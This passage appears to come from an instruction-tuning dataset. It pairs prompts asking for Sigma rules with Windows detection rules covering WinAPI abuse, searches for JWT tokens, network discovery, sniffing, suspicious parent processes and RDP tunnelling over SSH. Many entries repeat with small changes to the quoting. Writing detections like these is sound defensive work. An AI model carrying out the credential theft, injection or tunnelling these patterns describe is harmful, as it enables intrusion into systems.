'SetThreadToken'\n            # - 'user32'\n            - 'VirtualAlloc'\n            - 'VirtualFree'\n            - 'VirtualProtect'\n            - 'WaitForSingleObject'\n            - 'WriteInt32'\n            - 'WriteProcessMemory'\n            - 'ZeroFreeGlobalAllocUnicode'\n    filter_optional_mpcmdrun:\n        Image|endswith: '\\MpCmdRun.exe'\n        CommandLine|contains: 'GetLoadLibraryWAddress32'\n    filter_optional_compatTelRunner:\n        ParentImage|endswith: '\\CompatTelRunner.exe'\n        CommandLine|contains:\n            - 'FreeHGlobal'\n            - 'PtrToString'\n            - 'kernel32'\n            - 'CloseHandle'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Some legitimate action or applications may use these functions. Investigate further to determine the legitimacy of the activity.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "AddSecurityPackage AdjustTokenPrivileges Advapi32 CloseHandle CreateProcessWithToken CreatePseudoConsole CreateRemoteThread CreateThread CreateUserThread DangerousGetHandle DuplicateTokenEx EnumerateSecurityPackages FreeHGlobal FreeLibrary GetDelegateForFunctionPointer GetLogonSessionData GetModuleHandle GetProcAddress GetProcessHandle GetTokenInformation ImpersonateLoggedOnUser kernel32 LoadLibrary memcpy MiniDumpWriteDump ntdll OpenDesktop OpenProcess OpenProcessToken OpenThreadToken OpenWindowStation PtrToString QueueUserApc ReadProcessMemory RevertToSelf RtlCreateUserThread secur32 SetThreadToken VirtualAlloc VirtualFree VirtualProtect WaitForSingleObject WriteInt32 WriteProcessMemory ZeroFreeGlobalAllocUnicode \\MpCmdRun.exe GetLoadLibraryWAddress32 \\CompatTelRunner.exe FreeHGlobal PtrToString kernel32 CloseHandle", "output": "title: Potential WinAPI Calls Via CommandLine\nid: ba3f5c1b-6272-4119-9dbd-0bc8d21c2702\nrelated:\n    - id: 03d83090-8cba-44a0-b02f-0b756a050306\n      type: derived\nstatus: test\ndescription: Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec\nreferences:\n    - https://twitter.com/m417z/status/1566674631788007425\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-06\nmodified: 2025-03-06\ntags:\n    - attack.execution\n    - attack.t1106\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'AddSecurityPackage'\n            - 'AdjustTokenPrivileges'\n            - 'Advapi32'\n            - 'CloseHandle'\n            - 'CreateProcessWithToken'\n            - 'CreatePseudoConsole'\n            - 'CreateRemoteThread'\n            - 'CreateThread'\n            - 'CreateUserThread'\n            - 'DangerousGetHandle'\n            - 'DuplicateTokenEx'\n            - 'EnumerateSecurityPackages'\n            - 'FreeHGlobal'\n            - 'FreeLibrary'\n            - 'GetDelegateForFunctionPointer'\n            - 'GetLogonSessionData'\n            - 'GetModuleHandle'\n            - 'GetProcAddress'\n            - 'GetProcessHandle'\n            - 'GetTokenInformation'\n            - 'ImpersonateLoggedOnUser'\n            - 'kernel32'\n            - 'LoadLibrary'\n            - 'memcpy'\n            - 'MiniDumpWriteDump'\n            # - 'msvcrt'\n            - 'ntdll'\n            - 'OpenDesktop'\n            - 'OpenProcess'\n            - 'OpenProcessToken'\n            - 'OpenThreadToken'\n            - 'OpenWindowStation'\n            - 'PtrToString'\n            - 'QueueUserApc'\n            - 'ReadProcessMemory'\n            - 'RevertToSelf'\n            - 'RtlCreateUserThread'\n            - 'secur32'\n            - 'SetThreadToken'\n            # - 'user32'\n            - 'VirtualAlloc'\n            - 'VirtualFree'\n            - 'VirtualProtect'\n            - 'WaitForSingleObject'\n            - 'WriteInt32'\n            - 'WriteProcessMemory'\n            - 'ZeroFreeGlobalAllocUnicode'\n    filter_optional_mpcmdrun:\n        Image|endswith: '\\MpCmdRun.exe'\n        CommandLine|contains: 'GetLoadLibraryWAddress32'\n    filter_optional_compatTelRunner:\n        ParentImage|endswith: '\\CompatTelRunner.exe'\n        CommandLine|contains:\n            - 'FreeHGlobal'\n            - 'PtrToString'\n            - 'kernel32'\n            - 'CloseHandle'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Some legitimate action or applications may use these functions. Investigate further to determine the legitimacy of the activity.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "eyJ0eXAiOi eyJhbGciOi eyJ0eX 'eyJ0eX' eyJhbG 'eyJhbG'", "output": "title: Potentially Suspicious JWT Token Search Via CLI\nid: 6d3a3952-6530-44a3-8554-cf17c116c615\nstatus: test\ndescription: |\n    Detects possible search for JWT tokens via CLI by looking for the string \"eyJ0eX\" or \"eyJhbG\".\n    This string is used as an anchor to look for the start of the JWT token used by microsoft office and similar apps.\nreferences:\n    - https://mrd0x.com/stealing-tokens-from-office-applications/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-25\nmodified: 2024-10-06\ntags:\n    - attack.credential-access\n    - attack.t1528\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'eyJ0eXAiOi' # {\"typ\":\n            - 'eyJhbGciOi' # {\"alg\":\n            - ' eyJ0eX'\n            - ' \"eyJ0eX\"'\n            - \" 'eyJ0eX'\"\n            - ' eyJhbG'\n            - ' \"eyJhbG\"'\n            - \" 'eyJhbG'\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "eyJ0eXAiOi eyJhbGciOi eyJ0eX 'eyJ0eX' \"eyJhbG\" \"'eyJhbG'\"", "output": "title: Potentially Suspicious JWT Token Search Via CLI\nid: 6d3a3952-6530-44a3-8554-cf17c116c615\nstatus: test\ndescription: |\n    Detects possible search for JWT tokens via CLI by looking for the string \"eyJ0eX\" or \"eyJhbG\".\n    This string is used as an anchor to look for the start of the JWT token used by microsoft office and similar apps.\nreferences:\n    - https://mrd0x.com/stealing-tokens-from-office-applications/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-25\nmodified: 2024-10-06\ntags:\n    - attack.credential-access\n    - attack.t1528\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'eyJ0eXAiOi' # {\"typ\":\n            - 'eyJhbGciOi' # {\"alg\":\n            - ' eyJ0eX'\n            - ' \"eyJ0eX\"'\n            - \" 'eyJ0eX'\"\n            - ' eyJhbG'\n            - ' \"eyJhbG\"'\n            - \" 'eyJhbG'\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "eyJ0eXAiOi eyJ0eX 'eyJ0eX' eyJhbGciOi eyJhbG 'eyJhbG'", "output": "title: Potentially Suspicious JWT Token Search Via CLI\nid: 6d3a3952-6530-44a3-8554-cf17c116c615\nstatus: test\ndescription: |\n    Detects possible search for JWT tokens via CLI by looking for the string \"eyJ0eX\" or \"eyJhbG\".\n    This string is used as an anchor to look for the start of the JWT token used by microsoft office and similar apps.\nreferences:\n    - https://mrd0x.com/stealing-tokens-from-office-applications/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-25\nmodified: 2024-10-06\ntags:\n    - attack.credential-access\n    - attack.t1528\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'eyJ0eXAiOi' # {\"typ\":\n            - 'eyJhbGciOi' # {\"alg\":\n            - ' eyJ0eX'\n            - ' \"eyJ0eX\"'\n            - \" 'eyJ0eX'\"\n            - ' eyJhbG'\n            - ' \"eyJhbG\"'\n            - \" 'eyJhbG'\"\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ipconfig /all netsh interface show interface arp -a nbtstat -n net config route print", "output": "title: Suspicious Network Command\nid: a29c1813-ab1f-4dde-b489-330b952e91ae\nstatus: test\ndescription: Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1016/T1016.md#atomic-test-1---system-network-configuration-discovery-on-windows\nauthor: frack113, Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'\ndate: 2021-12-07\nmodified: 2022-04-11\ntags:\n    - attack.discovery\n    - attack.t1016\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'ipconfig /all'\n            - 'netsh interface show interface'\n            - 'arp -a'\n            - 'nbtstat -n'\n            - 'net config'\n            - 'route print'\n    condition: selection\nfalsepositives:\n    - Administrator, hotline ask to user\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ipconfig /all netsh interface show interface arp \\\"-a\\\" nbtstat -n net config route print", "output": "title: Suspicious Network Command\nid: a29c1813-ab1f-4dde-b489-330b952e91ae\nstatus: test\ndescription: Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1016/T1016.md#atomic-test-1---system-network-configuration-discovery-on-windows\nauthor: frack113, Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'\ndate: 2021-12-07\nmodified: 2022-04-11\ntags:\n    - attack.discovery\n    - attack.t1016\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'ipconfig /all'\n            - 'netsh interface show interface'\n            - 'arp -a'\n            - 'nbtstat -n'\n            - 'net config'\n            - 'route print'\n    condition: selection\nfalsepositives:\n    - Administrator, hotline ask to user\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ipconfig /all netsh interface show interface arp -a nbtstat -n net config route print", "output": "title: Suspicious Network Command\nid: a29c1813-ab1f-4dde-b489-330b952e91ae\nstatus: test\ndescription: Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1016/T1016.md#atomic-test-1---system-network-configuration-discovery-on-windows\nauthor: frack113, Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'\ndate: 2021-12-07\nmodified: 2022-04-11\ntags:\n    - attack.discovery\n    - attack.t1016\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'ipconfig /all'\n            - 'netsh interface show interface'\n            - 'arp -a'\n            - 'nbtstat -n'\n            - 'net config'\n            - 'route print'\n    condition: selection\nfalsepositives:\n    - Administrator, hotline ask to user\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "for foreach nslookup ping", "output": "title: Suspicious Scan Loop Network\nid: f8ad2e2c-40b6-4117-84d7-20b89896ab23\nstatus: test\ndescription: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\n    - https://ss64.com/nt/for.html\n    - https://ss64.com/ps/foreach-object.html\nauthor: frack113\ndate: 2022-03-12\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_loop:\n        CommandLine|contains:\n            - 'for '\n            - 'foreach '\n    selection_tools:\n        CommandLine|contains:\n            - 'nslookup'\n            - 'ping'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate script\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "for foreach nslookup \\\"p\\\"\\\"i\\\"\\\"n\\\"\\\"g\\\"", "output": "title: Suspicious Scan Loop Network\nid: f8ad2e2c-40b6-4117-84d7-20b89896ab23\nstatus: test\ndescription: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\n    - https://ss64.com/nt/for.html\n    - https://ss64.com/ps/foreach-object.html\nauthor: frack113\ndate: 2022-03-12\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_loop:\n        CommandLine|contains:\n            - 'for '\n            - 'foreach '\n    selection_tools:\n        CommandLine|contains:\n            - 'nslookup'\n            - 'ping'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate script\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "for foreach ping nslookup", "output": "title: Suspicious Scan Loop Network\nid: f8ad2e2c-40b6-4117-84d7-20b89896ab23\nstatus: test\ndescription: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md\n    - https://ss64.com/nt/for.html\n    - https://ss64.com/ps/foreach-object.html\nauthor: frack113\ndate: 2022-03-12\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_loop:\n        CommandLine|contains:\n            - 'for '\n            - 'foreach '\n    selection_tools:\n        CommandLine|contains:\n            - 'nslookup'\n            - 'ping'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate script\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tshark.exe -i \\windump.exe", "output": "title: Potential Network Sniffing Activity Using Network Tools\nid: ba1f7802-adc7-48b4-9ecb-81e227fddfd5\nstatus: test\ndescription: |\n    Detects potential network sniffing via use of network tools such as \"tshark\", \"windump\".\n    Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\n    An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1040/T1040.md\nauthor: Timur Zinniatullin, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-21\nmodified: 2023-02-20\ntags:\n    - attack.credential-access\n    - attack.discovery\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tshark:\n        Image|endswith: '\\tshark.exe'\n        CommandLine|contains: '-i'\n    selection_windump:\n        Image|endswith: '\\windump.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administration activity to troubleshoot network issues\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\tshark.exe\\\" -i \\windump.exe", "output": "title: Potential Network Sniffing Activity Using Network Tools\nid: ba1f7802-adc7-48b4-9ecb-81e227fddfd5\nstatus: test\ndescription: |\n    Detects potential network sniffing via use of network tools such as \"tshark\", \"windump\".\n    Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\n    An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1040/T1040.md\nauthor: Timur Zinniatullin, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-21\nmodified: 2023-02-20\ntags:\n    - attack.credential-access\n    - attack.discovery\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tshark:\n        Image|endswith: '\\tshark.exe'\n        CommandLine|contains: '-i'\n    selection_windump:\n        Image|endswith: '\\windump.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administration activity to troubleshoot network issues\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tshark -i \\windump", "output": "title: Potential Network Sniffing Activity Using Network Tools\nid: ba1f7802-adc7-48b4-9ecb-81e227fddfd5\nstatus: test\ndescription: |\n    Detects potential network sniffing via use of network tools such as \"tshark\", \"windump\".\n    Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\n    An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1040/T1040.md\nauthor: Timur Zinniatullin, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-21\nmodified: 2023-02-20\ntags:\n    - attack.credential-access\n    - attack.discovery\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tshark:\n        Image|endswith: '\\tshark.exe'\n        CommandLine|contains: '-i'\n    selection_windump:\n        Image|endswith: '\\windump.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administration activity to troubleshoot network issues\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\tshark.exe -i \\windump.exe", "output": "title: Potential Network Sniffing Activity Using Network Tools\nid: ba1f7802-adc7-48b4-9ecb-81e227fddfd5\nstatus: test\ndescription: |\n    Detects potential network sniffing via use of network tools such as \"tshark\", \"windump\".\n    Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\n    An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1040/T1040.md\nauthor: Timur Zinniatullin, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-21\nmodified: 2023-02-20\ntags:\n    - attack.credential-access\n    - attack.discovery\n    - attack.t1040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tshark:\n        Image|endswith: '\\tshark.exe'\n        CommandLine|contains: '-i'\n    selection_windump:\n        Image|endswith: '\\windump.exe'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administration activity to troubleshoot network issues\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\.exe", "output": "title: Process Launched Without Image Name\nid: f208d6d8-d83a-4c2c-960d-877c37da84e5\nstatus: test\ndescription: Detect the use of processes with no name (\".exe\"), which can be used to evade Image-based detections.\nreferences:\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\.exe'\n    condition: selection\nfalsepositives:\n    - Rare legitimate software.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\".\"\"e\"\"x\"\"e\"", "output": "title: Process Launched Without Image Name\nid: f208d6d8-d83a-4c2c-960d-877c37da84e5\nstatus: test\ndescription: Detect the use of processes with no name (\".exe\"), which can be used to evade Image-based detections.\nreferences:\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\.exe'\n    condition: selection\nfalsepositives:\n    - Rare legitimate software.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\", "output": "title: Process Launched Without Image Name\nid: f208d6d8-d83a-4c2c-960d-877c37da84e5\nstatus: test\ndescription: Detect the use of processes with no name (\".exe\"), which can be used to evade Image-based detections.\nreferences:\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\.exe'\n    condition: selection\nfalsepositives:\n    - Rare legitimate software.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\.exe", "output": "title: Process Launched Without Image Name\nid: f208d6d8-d83a-4c2c-960d-877c37da84e5\nstatus: test\ndescription: Detect the use of processes with no name (\".exe\"), which can be used to evade Image-based detections.\nreferences:\n    - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software\nauthor: Matt Anderson (Huntress)\ndate: 2024-07-23\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\.exe'\n    condition: selection\nfalsepositives:\n    - Rare legitimate software.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\minesweeper.exe \\winver.exe \\bitsadmin.exe \\csrss.exe \\certutil.exe \\eventvwr.exe \\calc.exe \\notepad.exe \\WerFault.exe \\wermgr.exe \\conhost.exe \\mmc.exe \\win32calc.exe \\notepad.exe", "output": "title: Suspicious Process Parents\nid: cbec226f-63d9-4eca-9f52-dfb6652f24df\nstatus: test\ndescription: Detects suspicious parent processes that should not have any children or should only have a single possible child program\nreferences:\n    - https://twitter.com/x86matthew/status/1505476263464607744?s=12\n    - https://svch0st.medium.com/stats-from-hunting-cobalt-strike-beacons-c17e56255f9b\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-21\nmodified: 2022-09-08\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\minesweeper.exe'\n            - '\\winver.exe'\n            - '\\bitsadmin.exe'\n    selection_special:\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\certutil.exe'\n         # - '\\schtasks.exe'\n            - '\\eventvwr.exe'\n            - '\\calc.exe'\n            - '\\notepad.exe'\n    filter_special:\n        Image|endswith:\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\conhost.exe' # csrss.exe, certutil.exe\n            - '\\mmc.exe'     # eventvwr.exe\n            - '\\win32calc.exe' # calc.exe\n            - '\\notepad.exe'\n    filter_null:\n        Image: null\n    condition: selection or ( selection_special and not 1 of filter_* )\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\minesweeper.exe \\winver.exe \\bitsadmin.exe \\csrss.exe \\certutil.exe \\eventvwr.exe \\calc.exe \\notepad.exe \\\"\\WerFault.exe\\\" \\\"\\wermgr.exe\\\" \\conhost.exe \\mmc.exe \\win32calc.exe \\notepad.exe", "output": "title: Suspicious Process Parents\nid: cbec226f-63d9-4eca-9f52-dfb6652f24df\nstatus: test\ndescription: Detects suspicious parent processes that should not have any children or should only have a single possible child program\nreferences:\n    - https://twitter.com/x86matthew/status/1505476263464607744?s=12\n    - https://svch0st.medium.com/stats-from-hunting-cobalt-strike-beacons-c17e56255f9b\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-21\nmodified: 2022-09-08\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\minesweeper.exe'\n            - '\\winver.exe'\n            - '\\bitsadmin.exe'\n    selection_special:\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\certutil.exe'\n         # - '\\schtasks.exe'\n            - '\\eventvwr.exe'\n            - '\\calc.exe'\n            - '\\notepad.exe'\n    filter_special:\n        Image|endswith:\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\conhost.exe' # csrss.exe, certutil.exe\n            - '\\mmc.exe'     # eventvwr.exe\n            - '\\win32calc.exe' # calc.exe\n            - '\\notepad.exe'\n    filter_null:\n        Image: null\n    condition: selection or ( selection_special and not 1 of filter_* )\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\minesweeper \\winver \\bitsadmin \\csrss \\certutil \\eventvwr \\calc \\notepad \\WerFault \\wermgr \\conhost \\mmc \\win32calc \\notepad", "output": "title: Suspicious Process Parents\nid: cbec226f-63d9-4eca-9f52-dfb6652f24df\nstatus: test\ndescription: Detects suspicious parent processes that should not have any children or should only have a single possible child program\nreferences:\n    - https://twitter.com/x86matthew/status/1505476263464607744?s=12\n    - https://svch0st.medium.com/stats-from-hunting-cobalt-strike-beacons-c17e56255f9b\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-21\nmodified: 2022-09-08\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\minesweeper.exe'\n            - '\\winver.exe'\n            - '\\bitsadmin.exe'\n    selection_special:\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\certutil.exe'\n         # - '\\schtasks.exe'\n            - '\\eventvwr.exe'\n            - '\\calc.exe'\n            - '\\notepad.exe'\n    filter_special:\n        Image|endswith:\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\conhost.exe' # csrss.exe, certutil.exe\n            - '\\mmc.exe'     # eventvwr.exe\n            - '\\win32calc.exe' # calc.exe\n            - '\\notepad.exe'\n    filter_null:\n        Image: null\n    condition: selection or ( selection_special and not 1 of filter_* )\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\minesweeper.exe \\winver.exe \\bitsadmin.exe \\csrss.exe \\certutil.exe \\eventvwr.exe \\calc.exe \\notepad.exe \\WerFault.exe \\wermgr.exe \\conhost.exe \\mmc.exe \\win32calc.exe \\notepad.exe", "output": "title: Suspicious Process Parents\nid: cbec226f-63d9-4eca-9f52-dfb6652f24df\nstatus: test\ndescription: Detects suspicious parent processes that should not have any children or should only have a single possible child program\nreferences:\n    - https://twitter.com/x86matthew/status/1505476263464607744?s=12\n    - https://svch0st.medium.com/stats-from-hunting-cobalt-strike-beacons-c17e56255f9b\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-21\nmodified: 2022-09-08\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\minesweeper.exe'\n            - '\\winver.exe'\n            - '\\bitsadmin.exe'\n    selection_special:\n        ParentImage|endswith:\n            - '\\csrss.exe'\n            - '\\certutil.exe'\n         # - '\\schtasks.exe'\n            - '\\eventvwr.exe'\n            - '\\calc.exe'\n            - '\\notepad.exe'\n    filter_special:\n        Image|endswith:\n            - '\\WerFault.exe'\n            - '\\wermgr.exe'\n            - '\\conhost.exe' # csrss.exe, certutil.exe\n            - '\\mmc.exe'     # eventvwr.exe\n            - '\\win32calc.exe' # calc.exe\n            - '\\notepad.exe'\n    filter_null:\n        Image: null\n    condition: selection or ( selection_special and not 1 of filter_* )\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": ":3389 -L -P -R -pw -ssh", "output": "title: Potential Remote Desktop Tunneling\nid: 8a3038e8-9c9d-46f8-b184-66234a160f6f\nstatus: test\ndescription: Detects potential use of an SSH utility to establish RDP over a reverse SSH Tunnel. This can be used by attackers to enable routing of network packets that would otherwise not reach their intended destination.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/potential-remote-desktop-tunneling-detected.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.lateral-movement\n    - attack.t1021\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: ':3389' # RDP port and usual SSH tunneling related switches in command line\n    selection_opt:\n        CommandLine|contains:\n            - ' -L '\n            - ' -P '\n            - ' -R '\n            - ' -pw '\n            - ' -ssh '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": ":3389 -L \"-P\" \"-R\" -pw -ssh", "output": "title: Potential Remote Desktop Tunneling\nid: 8a3038e8-9c9d-46f8-b184-66234a160f6f\nstatus: test\ndescription: Detects potential use of an SSH utility to establish RDP over a reverse SSH Tunnel. This can be used by attackers to enable routing of network packets that would otherwise not reach their intended destination.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/potential-remote-desktop-tunneling-detected.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.lateral-movement\n    - attack.t1021\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: ':3389' # RDP port and usual SSH tunneling related switches in command line\n    selection_opt:\n        CommandLine|contains:\n            - ' -L '\n            - ' -P '\n            - ' -R '\n            - ' -pw '\n            - ' -ssh '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": ":3389 -ssh -R -P -L -pw", "output": "title: Potential Remote Desktop Tunneling\nid: 8a3038e8-9c9d-46f8-b184-66234a160f6f\nstatus: test\ndescription: Detects potential use of an SSH utility to establish RDP over a reverse SSH Tunnel. This can be used by attackers to enable routing of network packets that would otherwise not reach their intended destination.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/potential-remote-desktop-tunneling-detected.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\ntags:\n    - attack.lateral-movement\n    - attack.t1021\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: ':3389' # RDP port and usual SSH tunneling related switches in command line\n    selection_opt:\n        CommandLine|contains:\n            - ' -L '\n            - ' -P '\n            - ' -R '\n            - ' -pw '\n            - ' -ssh '\n    condition: all of 